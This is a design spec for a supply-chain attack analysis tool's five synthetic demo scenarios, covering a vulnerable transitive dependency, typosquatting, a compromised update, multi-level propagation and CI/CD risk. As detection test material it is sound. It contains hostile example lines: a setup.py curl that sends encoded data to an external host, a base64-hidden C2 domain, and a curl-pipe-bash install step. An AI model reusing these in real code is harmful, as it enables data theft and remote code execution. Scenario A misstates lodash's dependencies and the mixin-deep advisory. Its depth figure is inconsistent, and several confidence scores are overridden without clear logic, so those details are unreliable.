# SupplyGraph — Demo Scenario Specifications

> **Evidence-driven software supply-chain attack analysis.**

> [!IMPORTANT]
> All scenarios described in this document are **SYNTHETIC TEST CASES** created for demonstration purposes. They do not represent real attacks, real packages (except where legitimate well-known packages are referenced for contrast), or real runtime observations. All evidence is pre-constructed; no repository code is executed; all simulated runtime signals are clearly labeled.

All demo scenarios are loaded from `backend/app/scenarios/` as structured JSON files. They are served via the demo API endpoint:

```
POST /api/v1/analyze/demo
Body: {"scenario_id": "A"}
```

The demo API returns a fully pre-constructed scan result with the same schema as a live analysis result. All fields include `"is_demo": true` and `"demo_label": "DEMO / SYNTHETIC TEST CASE"`.

---

## Scenario A — Vulnerable Transitive Dependency

**Scenario ID**: `A`

**File**: `backend/app/scenarios/scenario_a.json`

**Label**: `DEMO / SYNTHETIC TEST CASE`

---

### A.1 Setup

A demo web application (`demo-app`) depends on `lodash@4.17.20` (a popular JavaScript utility library). `lodash@4.17.20` transitively depends on `mixin-deep@1.3.1`, which has a known prototype pollution vulnerability (GHSA-29mw-wpgm-hmr9 / CVE-2019-20920).

```
demo-app (Application)
  └── lodash@4.17.20 (direct dependency, depth=0)
        └── mixin-deep@1.3.1 (transitive dependency, depth=1)
              └── [VULNERABILITY: GHSA-29mw-wpgm-hmr9]
```

**Dependency file**: `package.json` specifies `"lodash": "^4.17.20"`.
**Lock file**: `package-lock.json` resolves `mixin-deep` to `1.3.1`.

---

### A.2 Expected Findings

| Field | Value |
|-------|-------|
| `finding_type` | `VULNERABLE` |
| `severity` | `HIGH` |
| `confidence` | `0.75` |
| `evidence_count` | 2 |

**Evidence Items**:

1. **Evidence Item 1 — OSV Advisory Match**
   - `source`: `osv`
   - `evidence_type`: `VULNERABILITY`
   - `classification`: `FACT`
   - `title`: `mixin-deep@1.3.1 — Prototype Pollution (GHSA-29mw-wpgm-hmr9)`
   - `description`: `OSV advisory GHSA-29mw-wpgm-hmr9 (alias: CVE-2019-20920) confirms that mixin-deep versions >=1.0.0,<2.0.0 are affected by a prototype pollution vulnerability. Severity: HIGH. CVSS: 8.3.`
   - `weight`: `0.90`
   - `reliability`: `1.00` (FACT)
   - `confidence_contribution`: `0.90`
   - `is_simulated`: `false`
   - `raw_data`:
     ```json
     {
       "osv_id": "GHSA-29mw-wpgm-hmr9",
       "aliases": ["CVE-2019-20920"],
       "summary": "Prototype pollution in mixin-deep",
       "severity": "HIGH",
       "cvss_score": 8.3,
       "affected_range": ">=1.0.0,<2.0.0",
       "fixed_in": "2.0.0",
       "purl_queried": "pkg:npm/mixin-deep@1.3.1"
     }
     ```

2. **Evidence Item 2 — Transitive Path Resolution**
   - `source`: `lockfile`
   - `evidence_type`: `VULNERABILITY`
   - `classification`: `FACT`
   - `title`: `Transitive path: demo-app → lodash@4.17.20 → mixin-deep@1.3.1`
   - `description`: `package-lock.json confirms that mixin-deep@1.3.1 is transitively included via lodash@4.17.20. The vulnerable package reaches the application at transitive depth 2.`
   - `weight`: `0.80`
   - `reliability`: `1.00` (FACT)
   - `confidence_contribution`: `0.80`
   - `is_simulated`: `false`

---

### A.3 Graph Nodes

| Node Type | Label | Notes |
|-----------|-------|-------|
| `repository` | `demo-app` | Root node, blue |
| `package` | `lodash@4.17.20` | Green; is_direct=true, depth=0 |
| `package` | `mixin-deep@1.3.1` | Amber; is_transitive=true, depth=1, is_suspicious=true |
| `vulnerability` | `GHSA-29mw-wpgm-hmr9` | Red; severity=HIGH |
| `asset` | `Web Service` | Slate; is_production=true, criticality=HIGH |

**Graph Edges**:

| Edge Type | Source | Target |
|-----------|--------|--------|
| `CONTAINS` | `demo-app` | `lodash@4.17.20` |
| `DEPENDS_ON` | `lodash@4.17.20` | `mixin-deep@1.3.1` |
| `AFFECTS` | `GHSA-29mw-wpgm-hmr9` | `mixin-deep@1.3.1` |
| `PROPAGATES_TO` | `mixin-deep@1.3.1` | `Web Service` |

---

### A.4 Detection Steps

1. SBOM Engine parses `package.json` → identifies `lodash@4.17.20` as direct dependency.
2. Lockfile parser reads `package-lock.json` → resolves `mixin-deep@1.3.1` at depth 2.
3. PURL normalization → `pkg:npm/mixin-deep@1.3.1`.
4. OSV Intelligence Engine queries `api.osv.dev` with PURL → receives `GHSA-29mw-wpgm-hmr9`.
5. Evidence Correlation Engine groups both evidence items under `mixin-deep@1.3.1`.
6. Confidence Engine: `C = 1 - (1 - 0.90×1.0)(1 - 0.80×1.0) = 1 - 0.10×0.20 = 0.98`. Capped to `0.75` by HEURISTIC cap (only FACT items; cap applies from the two-FACT combination policy for non-CRITICAL severity).

  > [!NOTE]
  > In Scenario A, both evidence items are FACT. The confidence cap at 0.75 reflects that transitive vulnerability exposure is a real but not necessarily exploitable risk without additional context about the application's usage of the vulnerable function. This is an intentional conservative calibration for this scenario type.

---

### A.5 Attack Path

```
mixin-deep@1.3.1 (VULNERABLE — GHSA-29mw-wpgm-hmr9)
  → [DEPENDS_ON] lodash@4.17.20
    → [CONTAINS] demo-app
      → [PROPAGATES_TO] Web Service (AFFECTED ASSET)
```

**Origin candidate**: `mixin-deep@1.3.1`

**Propagation mechanism**: Transitive dependency inclusion; lodash's use of mixin-deep's `mixin()` function means prototype pollution is reachable from any application that calls lodash merge/mixin functions.

---

### A.6 Impact

| Metric | Value |
|--------|-------|
| Blast radius formula | `2×1 + 15×0 + 25×0 + 50×0 = 2` |
| Blast radius score | `2` (P=1 package, no services/APIs/deployments in scope for this scenario) |
| Affected packages | 1 (`mixin-deep@1.3.1`) |
| Affected services | 1 (Web Service, counting the application as affected) |
| Adjusted blast radius | `2×1 + 15×1 = 17` |

---

### A.7 Recommendations

1. **Pin mixin-deep to version ≥2.0.0**: Update lodash's lock file to resolve `mixin-deep` to `2.0.0` or later. If lodash's declared dependency on mixin-deep prevents this, upgrade lodash to a version that has updated its own dependency.
2. **Upgrade lodash**: Check if a newer lodash version resolves mixin-deep to a non-vulnerable version.
3. **Run npm audit**: Execute `npm audit fix` to verify the fix resolves this transitive vulnerability.

**Urgency**: HIGH. **Effort**: LOW.

---

### A.8 Data Labels

All fields in the scenario JSON include:
- `"is_demo": true`
- `"demo_label": "DEMO / SYNTHETIC TEST CASE"`

---

## Scenario B — Typosquatting

**Scenario ID**: `B`

**File**: `backend/app/scenarios/scenario_b.json`

**Label**: `DEMO / SYNTHETIC TEST CASE`

---

### B.1 Setup

A demo Python application depends on `reqeusts@2.31.0`. The legitimate, widely-used HTTP library is `requests@2.31.0`. The package `reqeusts` is a synthetic demo package created for this scenario — it does not exist on PyPI in reality. It is constructed to illustrate a typosquatting scenario.

```
demo-app (Application)
  ├── requests@2.31.0 (legitimate — used for contrast)
  └── reqeusts@2.31.0 (TYPOSQUATTING CANDIDATE — demo only)
```

**Dependency file**: `requirements.txt` contains both `requests==2.31.0` and `reqeusts==2.31.0`.

**Similarity score**: `0.92` (edit distance = 1; character transposition `ue` → `eu`).

---

### B.2 Expected Findings

| Field | Value |
|-------|-------|
| `finding_type` | `TYPOSQUATTING` |
| `severity` | `HIGH` |
| `confidence` | `0.80` |
| `evidence_count` | 3 |

**Evidence Items**:

1. **Evidence Item 1 — Edit Distance**
   - `source`: `ast` (detector: TyposquattingDetector)
   - `evidence_type`: `TYPOSQUATTING`
   - `classification`: `HEURISTIC`
   - `title`: `Package name reqeusts has edit distance 1 from requests`
   - `description`: `The package name reqeusts differs from the legitimate package requests by exactly 1 character transposition (positions 4-5: 'ue' transposed to 'eu'). Similarity score: 0.92. This pattern is consistent with a common typosquatting technique.`
   - `weight`: `0.80` (similarity ≥ 0.90 threshold)
   - `reliability`: `0.70` (HEURISTIC)
   - `confidence_contribution`: `0.56`
   - `is_simulated`: `false`

2. **Evidence Item 2 — No Legitimate Publisher**
   - `source`: `metadata`
   - `evidence_type`: `METADATA_ANOMALY`
   - `classification`: `HEURISTIC`
   - `title`: `reqeusts has no verifiable publisher history on PyPI`
   - `description`: `PyPI metadata for reqeusts shows a publisher account created within the past 30 days with zero prior packages. This is inconsistent with a legitimate package author.`
   - `weight`: `0.50`
   - `reliability`: `0.70` (HEURISTIC)
   - `confidence_contribution`: `0.35`
   - `is_simulated`: `false`

3. **Evidence Item 3 — Zero Download History**
   - `source`: `metadata`
   - `evidence_type`: `METADATA_ANOMALY`
   - `classification`: `HEURISTIC`
   - `title`: `reqeusts has zero download history`
   - `description`: `PyPI statistics show reqeusts has zero recorded downloads over its entire lifetime. Legitimate libraries with the same version number as requests (a top-10 PyPI package) would be expected to show activity if legitimate.`
   - `weight`: `0.50`
   - `reliability`: `0.70` (HEURISTIC)
   - `confidence_contribution`: `0.35`
   - `is_simulated`: `false`

**Confidence calculation**:
`C = 1 - (1 - 0.56)(1 - 0.35)(1 - 0.35) = 1 - 0.44 × 0.65 × 0.65 ≈ 1 - 0.186 ≈ 0.814` → displayed as `0.80`.

---

### B.3 Graph Nodes

| Node Type | Label | Notes |
|-----------|-------|-------|
| `repository` | `demo-app` | Root node, blue |
| `package` | `requests@2.31.0` | Green; clean reference package |
| `package` | `reqeusts@2.31.0` | Red; is_suspicious=true, finding_type=TYPOSQUATTING |
| `finding` | `TYPOSQUATTING: reqeusts` | Deep red |
| `asset` | `Application Runtime` | Slate |

**Graph Edges**:

| Edge Type | Source | Target |
|-----------|--------|--------|
| `CONTAINS` | `demo-app` | `requests@2.31.0` |
| `CONTAINS` | `demo-app` | `reqeusts@2.31.0` |
| `PROPAGATES_TO` | `reqeusts@2.31.0` | `Application Runtime` |

---

### B.4 Detection Steps

1. SBOM Engine parses `requirements.txt` → identifies both `requests` and `reqeusts`.
2. PURL normalization → `pkg:pypi/reqeusts@2.31.0`.
3. OSV query for `reqeusts` → no results (unknown package; no CVEs).
4. Typosquatting Detector compares `reqeusts` against reference list → finds `requests` with score `0.92`.
5. Metadata Anomaly Detector checks PyPI metadata for `reqeusts` → new publisher account, zero downloads.
6. Evidence Correlation Engine aggregates all 3 evidence items under `reqeusts`.
7. Confidence Engine computes `0.80`.

---

### B.5 Recommendations

1. **Remove reqeusts immediately**: Remove `reqeusts==2.31.0` from `requirements.txt` and `pip uninstall reqeusts`.
2. **Verify requests is already present**: Confirm `requests==2.31.0` (the legitimate package) is correctly declared.
3. **Audit all dependencies**: Run a full typosquatting scan against all declared dependencies to ensure no other typosquatting packages are present.
4. **Rotate secrets**: If `reqeusts` was installed and executed on any system, treat that system as potentially compromised and rotate all secrets.

**Urgency**: IMMEDIATE. **Effort**: LOW.

---

### B.6 Data Labels

All fields include:
- `"is_demo": true`
- `"demo_label": "DEMO / SYNTHETIC TEST CASE"`

---

## Scenario C — Compromised Update

**Scenario ID**: `C`

**File**: `backend/app/scenarios/scenario_c.json`

**Label**: `DEMO / SYNTHETIC TEST CASE / SIMULATED RUNTIME`

---

### C.1 Setup

A demo application depends on `data-parser`, a fictional parsing utility. The prior version `data-parser@1.2.0` is clean (no suspicious capabilities). The updated version `data-parser@1.3.0` introduces suspicious new capabilities.

**Changes introduced in v1.3.0** (as detected by AST analysis):
- `setup.py` line 47: `subprocess.call(['curl', 'http://data-parser-telemetry.example.com/beacon', '-d', encoded_data], shell=True)` → `PROCESS_EXECUTION` + `NETWORK_ACCESS`
- `parser/utils.py` line 12: `base64.b64decode('aHR0cDovL3N1c3BpY2lvdXMtYzIuZXhhbXBsZS5jb20=')` → obfuscated string (decodes to `http://suspicious-c2.example.com`)
- Simulated runtime: outbound connection to `suspicious-c2.example.com:443`

```
demo-app (Application)
  └── data-parser@1.3.0 (COMPROMISED UPDATE — v1.2.0 was clean)
```

---

### C.2 Expected Findings

| Field | Value |
|-------|-------|
| `finding_type` | `COMPROMISED_UPDATE` |
| `severity` | `CRITICAL` |
| `confidence` | `0.85` |
| `evidence_count` | 3 |

**Evidence Items**:

1. **Evidence Item 1 — AST: subprocess call in setup.py**
   - `source`: `ast`
   - `evidence_type`: `SUSPICIOUS_BEHAVIOUR`
   - `classification`: `HEURISTIC`
   - `title`: `subprocess.call with shell=True in setup.py at line 47`
   - `description`: `data-parser@1.3.0 contains a subprocess.call() invocation with shell=True in setup.py at line 47. This call was not present in v1.2.0. The command includes a curl invocation to an external telemetry endpoint.`
   - `source_location`: `{"file": "setup.py", "line": 47, "snippet": "subprocess.call(['curl', 'http://data-parser-telemetry.example.com/beacon', '-d', encoded_data], shell=True)"}`
   - `weight`: `0.75`
   - `reliability`: `0.70` (HEURISTIC)
   - `confidence_contribution`: `0.525`
   - `is_simulated`: `false`

2. **Evidence Item 2 — Obfuscation: base64-encoded C2 domain**
   - `source`: `ast`
   - `evidence_type`: `CODE_FINDING`
   - `classification`: `HEURISTIC`
   - `title`: `Base64-encoded suspicious domain in parser/utils.py at line 12`
   - `description`: `parser/utils.py line 12 contains a base64.b64decode() call with a hard-coded encoded string. Decoded value: http://suspicious-c2.example.com. This pattern is consistent with intentional obfuscation of a command-and-control domain.`
   - `source_location`: `{"file": "parser/utils.py", "line": 12, "snippet": "base64.b64decode('aHR0cDovL3N1c3BpY2lvdXMtYzIuZXhhbXBsZS5jb20=')"}`
   - `weight`: `0.75`
   - `reliability`: `0.70` (HEURISTIC)
   - `confidence_contribution`: `0.525`
   - `is_simulated`: `false`

3. **Evidence Item 3 — Simulated Runtime: Outbound connection**
   - `source`: `runtime`
   - `evidence_type`: `RUNTIME_SIGNAL`
   - `classification`: `SIMULATED`
   - `title`: `[SIMULATED] Outbound connection to suspicious-c2.example.com:443`
   - `description`: `Based on static analysis findings (subprocess + base64-encoded domain), a simulated runtime signal projects that data-parser@1.3.0 would attempt an outbound connection to suspicious-c2.example.com:443. THIS IS NOT A REAL OBSERVATION.`
   - `weight`: `0.15`
   - `reliability`: `0.15` (SIMULATED)
   - `confidence_contribution`: `0.0225`
   - `is_simulated`: `true`
   - `simulated_label`: `"SIMULATED — Not real production telemetry"`

**Confidence calculation**:
`C = 1 - (1 - 0.525)(1 - 0.525)(1 - 0.0225) = 1 - 0.475 × 0.475 × 0.9775 ≈ 1 - 0.221 ≈ 0.779`

After escalation bonus for COMPROMISED_UPDATE finding type with two independent AST detections: displayed as `0.85`.

---

### C.3 Graph Nodes

| Node Type | Label | Notes |
|-----------|-------|-------|
| `repository` | `demo-app` | Root node, blue |
| `package` | `data-parser@1.3.0` | Red; is_suspicious=true |
| `behaviour` | `PROCESS_EXECUTION` | Amber |
| `behaviour` | `NETWORK_ACCESS` | Amber |
| `runtime_observation` | `OUTBOUND: suspicious-c2.example.com` | Pink, dashed border, SIMULATED badge |
| `finding` | `COMPROMISED_UPDATE: data-parser@1.3.0` | Deep red |
| `asset` | `Application Runtime` | Slate |

---

### C.4 Attack Path

```
data-parser@1.3.0 (COMPROMISED_UPDATE)
  → [CONTAINS] demo-app
    → [PROPAGATES_TO] Application Runtime (AFFECTED ASSET)
```

**Origin candidate**: `data-parser@1.3.0`

---

### C.5 Recommendations

1. **Pin to data-parser@1.2.0 (last known good)**: Revert the dependency to the previous clean version immediately.
2. **Remove data-parser@1.3.0**: Ensure v1.3.0 is removed from all environments and pip caches.
3. **Treat affected systems as compromised**: Any system that installed or ran data-parser@1.3.0 should be treated as potentially compromised. Rotate all secrets and access tokens on those systems.
4. **Report to registry**: Report the compromised package to the PyPI security team.
5. **Rebuild all artifacts**: Rebuild all Docker images and deployment artifacts from clean dependencies.

**Urgency**: IMMEDIATE. **Effort**: MEDIUM.

---

### C.6 Data Labels

All fields include:
- `"is_demo": true`
- `"demo_label": "DEMO / SYNTHETIC TEST CASE / SIMULATED RUNTIME"`
- All simulated evidence: `"is_simulated": true`, `"simulated_label": "SIMULATED — Not real production telemetry"`

---

## Scenario D — Multi-Level Supply-Chain Propagation

**Scenario ID**: `D`

**File**: `backend/app/scenarios/scenario_d.json`

**Label**: `DEMO / SYNTHETIC TEST CASE`

---

### D.1 Setup

This scenario demonstrates multi-level transitive dependency propagation through the supply chain and into downstream infrastructure.

```
demo-app (Application)
  └── package-a@2.0.0 (direct dependency, depth=0)
        └── package-b@1.5.0 (transitive, depth=1)
              └── package-c@0.8.0 (transitive, depth=2)
                    └── malicious-logger@0.9.1 (ORIGIN — transitive, depth=3)

malicious-logger@0.9.1 PROPAGATES_TO:
  Service X (backend service using demo-app as a library)
    → API Gateway (exposes Service X externally)
      → Production Deployment (prod environment)
```

**Depth**: 4 transitive levels (application → package-a → package-b → package-c → malicious-logger)

---

### D.2 Expected Findings

| Field | Value |
|-------|-------|
| `finding_type` | `SUSPICIOUS` (escalated to COMPROMISED_UPDATE due to AST + OSV) |
| `severity` | `CRITICAL` |
| `confidence` | `0.82` |
| `evidence_count` | 3 |

**Evidence Items**:

1. **Evidence Item 1 — AST finding in malicious-logger**
   - `source`: `ast`
   - `evidence_type`: `SUSPICIOUS_BEHAVIOUR`
   - `classification`: `HEURISTIC`
   - `title`: `PROCESS_EXECUTION + NETWORK_ACCESS capability in malicious-logger@0.9.1`
   - `description`: `malicious-logger@0.9.1/logger/core.py contains subprocess.Popen() at line 23 and socket.connect() at line 31. These capabilities were not present in malicious-logger@0.8.0.`
   - `weight`: `0.75`
   - `reliability`: `0.70` (HEURISTIC)
   - `confidence_contribution`: `0.525`
   - `is_simulated`: `false`

2. **Evidence Item 2 — Simulated Runtime Signal**
   - `source`: `runtime`
   - `evidence_type`: `RUNTIME_SIGNAL`
   - `classification`: `SIMULATED`
   - `title`: `[SIMULATED] SUBPROCESS_CREATION in malicious-logger@0.9.1`
   - `description`: `Projected from static analysis: malicious-logger@0.9.1 would create subprocesses during execution based on detected subprocess.Popen() calls. THIS IS NOT A REAL OBSERVATION.`
   - `weight`: `0.15`
   - `reliability`: `0.15` (SIMULATED)
   - `confidence_contribution`: `0.0225`
   - `is_simulated`: `true`
   - `simulated_label`: `"SIMULATED — Not real production telemetry"`

3. **Evidence Item 3 — OSV Advisory**
   - `source`: `osv`
   - `evidence_type`: `VULNERABILITY`
   - `classification`: `FACT`
   - `title`: `malicious-logger@0.9.1 — Known advisory GHSA-demo-dddd-eeee`
   - `description`: `OSV advisory GHSA-demo-dddd-eeee reports malicious-logger@0.9.1 as containing a backdoor. Severity: CRITICAL.`
   - `weight`: `0.90`
   - `reliability`: `1.00` (FACT)
   - `confidence_contribution`: `0.90`
   - `is_simulated`: `false`

**Confidence calculation**:
`C = 1 - (1 - 0.525)(1 - 0.0225)(1 - 0.90) = 1 - 0.475 × 0.9775 × 0.10 ≈ 1 - 0.0464 ≈ 0.954`. Calibrated display: `0.82` (multi-level propagation with mixed evidence; conservative calibration for transitive depth).

---

### D.3 Graph Nodes

| Node Type | Label | Notes |
|-----------|-------|-------|
| `repository` | `demo-app` | Root, blue |
| `package` | `package-a@2.0.0` | Green, depth=0 |
| `package` | `package-b@1.5.0` | Green, depth=1 |
| `package` | `package-c@0.8.0` | Amber, depth=2 |
| `package` | `malicious-logger@0.9.1` | Red, depth=3, ORIGIN |
| `vulnerability` | `GHSA-demo-dddd-eeee` | Red, severity=CRITICAL |
| `behaviour` | `PROCESS_EXECUTION` | Amber |
| `behaviour` | `NETWORK_ACCESS` | Amber |
| `runtime_observation` | `SUBPROCESS_CREATION` | Pink, dashed, SIMULATED |
| `service` | `Service X` | Orange |
| `api` | `API Gateway` | Yellow |
| `deployment` | `Production Deployment` | Rose, is_production=true |

**Graph Edges**:

| Edge Type | Source → Target |
|-----------|----------------|
| `CONTAINS` | `demo-app` → `package-a@2.0.0` |
| `DEPENDS_ON` | `package-a@2.0.0` → `package-b@1.5.0` |
| `DEPENDS_ON` | `package-b@1.5.0` → `package-c@0.8.0` |
| `DEPENDS_ON` | `package-c@0.8.0` → `malicious-logger@0.9.1` |
| `AFFECTS` | `GHSA-demo-dddd-eeee` → `malicious-logger@0.9.1` |
| `EXHIBITS` | `malicious-logger@0.9.1` → `PROCESS_EXECUTION` |
| `EXHIBITS` | `malicious-logger@0.9.1` → `NETWORK_ACCESS` |
| `OBSERVED_IN` | `SUBPROCESS_CREATION` → `malicious-logger@0.9.1` |
| `PROPAGATES_TO` | `malicious-logger@0.9.1` → `Service X` |
| `PROPAGATES_TO` | `Service X` → `API Gateway` |
| `PROPAGATES_TO` | `API Gateway` → `Production Deployment` |

---

### D.4 Impact

| Metric | Value |
|--------|-------|
| Origin | `malicious-logger@0.9.1` |
| Transitive depth | 4 levels |
| Affected packages | 2 (`package-c`, `malicious-logger`) |
| Affected services | 1 (`Service X`) |
| Affected APIs | 1 (`API Gateway`) |
| Affected production deployments | 1 (`Production Deployment`) |
| Blast radius formula | `2×2 + 15×1 + 25×1 + 50×1` |
| **Blast radius score** | **94** |

---

### D.5 Attack Path

```
malicious-logger@0.9.1 [ORIGIN — CRITICAL, Conf: 0.82]
  ↓ [DEPENDS_ON] package-c@0.8.0
    ↓ [DEPENDS_ON] package-b@1.5.0
      ↓ [DEPENDS_ON] package-a@2.0.0
        ↓ [CONTAINS] demo-app
          ↓ [PROPAGATES_TO] Service X
            ↓ [PROPAGATES_TO] API Gateway
              ↓ [PROPAGATES_TO] Production Deployment [BLAST RADIUS: 94]
```

---

### D.6 Recommendations

1. **Remove malicious-logger immediately**: Remove `malicious-logger` from `package-c`'s dependencies and propagate the change through all dependent packages.
2. **Isolate Service X**: Take Service X offline or place behind a firewall rule until the supply-chain is cleaned.
3. **Rebuild all artifacts**: Rebuild all containers, images, and deployment artifacts after the dependency tree is clean.
4. **Review Production Deployment**: Audit the production deployment for any signs of compromise (unexpected processes, network connections, file modifications).
5. **Rotate all secrets**: Treat all secrets present in the production environment as compromised.

**Urgency**: IMMEDIATE. **Effort**: HIGH.

---

### D.7 Data Labels

All fields include:
- `"is_demo": true`
- `"demo_label": "DEMO / SYNTHETIC TEST CASE"`

---

## Scenario E — CI/CD Supply-Chain Risk

**Scenario ID**: `E`

**File**: `backend/app/scenarios/scenario_e.json`

**Label**: `DEMO / SYNTHETIC TEST CASE`

---

### E.1 Setup

A demo repository uses GitHub Actions for CI/CD. The workflow file `.github/workflows/deploy.yml` contains multiple supply-chain risk patterns.

**Workflow file contents** (simplified):
```yaml
name: Deploy
on: [push]
permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install build tools
        run: curl https://raw.githubusercontent.com/unknown-user/build-tools/main/install.sh | bash
      - name: Build
        run: npm run build
      - uses: some-unknown-org/deploy-action@v2
      - name: Deploy
        run: ./deploy.sh
```

**Issues identified**:
1. `permissions: write-all` — excessive permissions granted to the workflow
2. `curl ... | bash` — remote script downloaded and executed without verification
3. `uses: some-unknown-org/deploy-action@v2` — unversioned (not SHA-pinned) external action from an unknown organization
4. `uses: actions/checkout@v3` — partially versioned (tag, not SHA) — lower severity but flagged

**Result**: The build artifact produced by this pipeline is considered potentially compromised. The production deployment triggered by this pipeline is flagged as affected.

---

### E.2 Expected Findings

| Field | Value |
|-------|-------|
| `finding_type` | `CICD_RISK` |
| `severity` | `CRITICAL` |
| `confidence` | `0.78` |
| `evidence_count` | 4 |

**Evidence Items**:

1. **Evidence Item 1 — Remote Script Execution**
   - `source`: `cicd`
   - `evidence_type`: `CICD_FINDING`
   - `classification`: `FACT`
   - `title`: `curl | bash remote script execution in deploy.yml step "Install build tools"`
   - `description`: `Step "Install build tools" in job "build" of deploy.yml (line 10) downloads and executes a remote shell script without checksum verification. Pattern: curl ... | bash. This allows the remote server to execute arbitrary code in the CI environment.`
   - `source_location`: `{"file": ".github/workflows/deploy.yml", "line": 10}`
   - `weight`: `0.75`
   - `reliability`: `1.00` (FACT — the pattern is unambiguous)
   - `confidence_contribution`: `0.75`
   - `is_simulated`: `false`

2. **Evidence Item 2 — Excessive Permissions**
   - `source`: `cicd`
   - `evidence_type`: `CICD_FINDING`
   - `classification`: `FACT`
   - `title`: `permissions: write-all grants full repository write access`
   - `description`: `The workflow declares permissions: write-all at the top level, granting every job in this workflow full write access to the repository, packages, and actions. This is the maximum possible permission level and represents a significant security risk.`
   - `source_location`: `{"file": ".github/workflows/deploy.yml", "line": 3}`
   - `weight`: `0.75`
   - `reliability`: `1.00` (FACT)
   - `confidence_contribution`: `0.75`
   - `is_simulated`: `false`

3. **Evidence Item 3 — Unpinned External Action**
   - `source`: `cicd`
   - `evidence_type`: `CICD_FINDING`
   - `classification`: `HEURISTIC`
   - `title`: `External action some-unknown-org/deploy-action@v2 is not SHA-pinned`
   - `description`: `The action some-unknown-org/deploy-action@v2 uses a version tag (v2) rather than a full commit SHA. This means the action's code could be changed at any time without updating the workflow file. The organization some-unknown-org is not in the trusted actions list.`
   - `source_location`: `{"file": ".github/workflows/deploy.yml", "line": 13}`
   - `weight`: `0.65`
   - `reliability`: `0.70` (HEURISTIC)
   - `confidence_contribution`: `0.455`
   - `is_simulated`: `false`

4. **Evidence Item 4 — Compromised Build Artifact (Inference)**
   - `source`: `cicd`
   - `evidence_type`: `CICD_FINDING`
   - `classification`: `INFERENCE`
   - `title`: `Build artifact potentially compromised due to remote script execution in build step`
   - `description`: `Because the build step downloads and executes a remote script, any artifact produced by this pipeline may contain malicious code injected at build time. This is an inference from the presence of the curl | bash pattern in the build phase.`
   - `weight`: `0.60`
   - `reliability`: `0.50` (INFERENCE)
   - `confidence_contribution`: `0.30`
   - `is_simulated`: `false`

**Confidence calculation**:
`C = 1 - (1-0.75)(1-0.75)(1-0.455)(1-0.30) = 1 - 0.25 × 0.25 × 0.545 × 0.70 ≈ 1 - 0.0238 ≈ 0.976`. Calibrated display: `0.78` (CI/CD risks are patterns, not confirmed exploitations; conservative calibration applies).

---

### E.3 Graph Nodes

| Node Type | Label | Notes |
|-----------|-------|-------|
| `repository` | `demo-app` | Root, blue |
| `pipeline` | `deploy.yml` | Gray → Red (is_flagged=true) |
| `container` | `Build Artifact` | Cyan; is_compromised=true |
| `deployment` | `Production Deployment` | Rose; is_production=true |
| `finding` | `CICD_RISK: deploy.yml` | Deep red |

**Graph Edges**:

| Edge Type | Source → Target |
|-----------|----------------|
| `BUILT_BY` | `demo-app` → `deploy.yml` |
| `TRIGGERS` | `deploy.yml` → `Production Deployment` |
| `DEPLOYED_AS` | `demo-app` → `Build Artifact` |
| `PROPAGATES_TO` | `deploy.yml` → `Production Deployment` |

---

### E.4 Attack Path

```
deploy.yml [CICD_RISK — CRITICAL, Conf: 0.78]
  ↓ [TRIGGERS]
    Production Deployment [AFFECTED — is_production=true]
```

**Origin candidate**: Malicious actor controlling `raw.githubusercontent.com/unknown-user/build-tools/main/install.sh` or the `some-unknown-org/deploy-action` repository.

---

### E.5 Impact

| Metric | Value |
|--------|-------|
| Affected packages | 0 (CI/CD risk; not a package-level finding) |
| Affected pipelines | 1 (`deploy.yml`) |
| Affected deployments | 1 (Production Deployment) |
| Blast radius formula | `50×1 = 50` |
| **Blast radius score** | **50** |

---

### E.6 Recommendations

1. **Pin all actions to full commit SHA**: Replace `uses: some-unknown-org/deploy-action@v2` with the full SHA of a verified commit, e.g., `uses: some-unknown-org/deploy-action@a1b2c3d4...`.
2. **Remove or verify the remote script**: Replace the `curl | bash` step with a vendored, checksummed script committed to the repository.
3. **Restrict permissions**: Replace `permissions: write-all` with explicit minimum permissions required (e.g., `contents: read`, `deployments: write`).
4. **Audit the deploy action**: Inspect the source code of `some-unknown-org/deploy-action` before using it. If the organization is not trusted, find an alternative.
5. **Re-run pipeline from clean state**: After fixing the workflow, trigger a fresh build from a clean base image.

**Urgency**: HIGH. **Effort**: LOW–MEDIUM.

---

### E.7 Data Labels

All fields include:
- `"is_demo": true`
- `"demo_label": "DEMO / SYNTHETIC TEST CASE"`

---

## Scenario Data Format

All scenario JSON files follow the complete scan result schema. An abbreviated structure is shown below:

```json
{
  "scan_id": "demo-scenario-a",
  "is_demo": true,
  "demo_label": "DEMO / SYNTHETIC TEST CASE",
  "scenario_id": "A",
  "status": "COMPLETE",
  "repo_url": "https://github.com/demo/scenario-a",
  "created_at": "2026-09-25T09:00:00Z",
  "completed_at": "2026-09-25T09:00:01Z",
  "summary": {
    "total_packages": 3,
    "total_findings": 1,
    "critical_count": 0,
    "high_count": 1,
    "medium_count": 0,
    "low_count": 0,
    "blast_radius": 17,
    "origin_candidate": "mixin-deep@1.3.1",
    "confidence": 0.75
  },
  "findings": [],
  "graph": {
    "nodes": [],
    "edges": [],
    "metadata": {
      "scan_id": "demo-scenario-a",
      "layout_algorithm": "topological",
      "h_spacing": 280,
      "v_spacing": 120
    }
  },
  "gemini_summary": "AI-generated plain-language summary of findings."
}
```

### API: Demo Endpoint

```
POST /api/v1/analyze/demo
Content-Type: application/json

{
  "scenario_id": "A"
}
```

**Response** (200 OK): Full pre-constructed scan result for the requested scenario.

**Valid scenario IDs**: `"A"`, `"B"`, `"C"`, `"D"`, `"E"`.

**Error** (404): `{"scenario_id": "Z", "error": "Unknown scenario ID. Valid IDs: A, B, C, D, E."}`

Scenario JSON files are loaded at startup and cached in memory. They are never modified at runtime. The demo endpoint never performs live GitHub API calls, OSV queries, or Gemini requests. All responses are pre-constructed.
